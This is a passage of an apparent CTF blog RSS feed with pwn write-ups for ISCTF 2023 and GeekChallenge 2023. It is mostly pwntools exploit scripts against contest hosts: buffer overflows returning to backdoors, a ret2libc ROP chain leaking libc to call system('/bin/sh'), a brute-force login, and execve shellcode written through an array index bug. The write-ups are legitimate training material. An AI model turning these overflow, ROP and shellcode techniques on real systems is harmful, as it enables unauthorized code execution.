class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">22959</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012ee</span></span><br><span class="line"><span class="comment">#0x20 + 8 + 2 = 42</span></span><br><span class="line"><span class="comment">#0x20 - 4 = 28 </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;42&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&quot;\x27&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\xee&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x12&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/11/29/ISCTF-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>GeekChallenge 2023 wp pwn 部分题解</title>
      <link>http://example.com/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</link>
      <guid>http://example.com/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</guid>
      <pubDate>Tue, 28 Nov 2023 14:59:51 GMT</pubDate>
      
      <description>&lt;h3 id=&quot;nc-pwntools&quot;&gt;&lt;a href=&quot;#nc-pwntools&quot; class=&quot;headerlink&quot; title=&quot;nc pwntools&quot;&gt;&lt;/a&gt;nc pwntools&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p=remote(&lt;span class=&quot;string&quot;&gt;&amp;quot;pwn.node.game.sycsec.com&amp;quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;31441&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context(arch=&lt;span class=&quot;string&quot;&gt;&amp;quot;amd64&amp;quot;&lt;/span&gt;,os=&lt;span class=&quot;string&quot;&gt;&amp;quot;linux&amp;quot;&lt;/span&gt;,log_level=&lt;span class=&quot;string&quot;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pd1 = &lt;span class=&quot;string&quot;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;92&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;b&amp;#x27;&#92;x53&#92;x79&#92;x63&#92;x6c&#92;x6F&#92;x76&#92;x65&#92;x72&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;b&amp;#x27;This string need to be 100 characters long&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.send(pd1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.recvuntil(&lt;span class=&quot;string&quot;&gt;b&amp;#x27;2.This challenge is harder than first one&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;calc = p.recvuntil(&lt;span class=&quot;string&quot;&gt;&amp;#x27;=&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(&lt;span class=&quot;built_in&quot;&gt;str&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(calc)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h3 id="nc-pwntools"><a href="#nc-pwntools" class="headerlink" title="nc pwntools"></a>nc pwntools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31441</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span> + <span class="string">b&#x27;\x53\x79\x63\x6c\x6F\x76\x65\x72&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This string need to be 100 characters long&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pd1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;2.This challenge is harder than first one&#x27;</span>)</span><br><span class="line">calc = p.recvuntil(<span class="string">&#x27;=&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(calc)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>开了pie，最后三位不变，直接改最后一位字节就可以跳转到backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31396</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>) + <span class="string">b&#x27;\x27&#x27;</span></span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>泄露gets的地址，要在附件中找到这个片段mov_edx_edi_eax，其他的都很常规</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">30616</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt.write</span><br><span class="line">gets_got = elf.got.gets</span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401333</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401331</span></span><br><span class="line">mov_edx_edi_eax = <span class="number">0x0000000000401288</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">pd = offset</span><br><span class="line">pd += p64(pop_rsi_r15) + p64(gets_got) + p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(mov_edx_edi_eax)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">gets_addr = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&quot;gets_addr:%#x&quot;</span>,gets_addr)</span><br><span class="line"></span><br><span class="line">libc_base = gets_addr - libc.symbols[<span class="string">b&#x27;gets&#x27;</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pd2 = offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(libc_system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,pd2)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>直接爆破，密码是随机数，第一个字节有256种情况，爆破到第一个字节为\x00的时候就通了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012F3</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">b&#x27;Wrong&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="string">b&#x27;Wrong&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line"></span><br><span class="line">    p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">30542</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;please enter user name:&quot;</span>)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line">    p.sendline(pd)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;please enter password:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    res = p.recv(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h3><p>第一个scanf传什么没什么关系，随便传，利用for循环内指针改返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31848</span>)</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x40134D</span></span><br><span class="line">backdoor = <span class="number">0x401225</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;\x11\x22\x33\x44\x55\x66\x77\x88&#x27;</span></span><br><span class="line">p.sendline(pd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-28&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h3><p>第一个scanf传入shellcode，再修改返回地址回到shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;pwn.node.game.sycsec.com&quot;</span>,<span class="number">31409</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index_addr:0x&quot;</span>)</span><br><span class="line">v1_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">4</span></span><br><span class="line">hax_v1_addr = <span class="built_in">hex</span>(v1_addr)</span><br><span class="line">v2_addr= hax_v1_addr[<span class="number">2</span>:]</span><br><span class="line">info(<span class="string">&quot;v2_addr:%s&quot;</span>,v2_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>,<span class="number">2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="number">40</span>+i/<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;value:&quot;</span>)</span><br><span class="line">    p.sendline(v2_addr[<span class="number">11</span>-i-<span class="number">1</span>:<span class="number">11</span>-i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
